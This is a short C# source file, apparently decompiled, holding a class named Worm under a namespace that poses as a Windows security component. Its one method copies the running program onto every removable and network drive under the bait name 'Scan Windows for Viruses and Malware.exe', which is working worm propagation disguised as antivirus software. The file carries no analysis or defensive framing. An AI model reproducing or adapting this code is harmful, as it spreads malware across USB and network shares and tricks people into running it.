using System.IO;
using System.Reflection;

namespace WindowsRuntimeSecurity.MiscMethods;

internal class Worm
{
	public static void BeginInfection()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.AvailableFreeSpace > 12000000L && (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network))
			{
				File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.Name + "Scan Windows for Viruses and Malware.exe");
			}
		}
	}
}
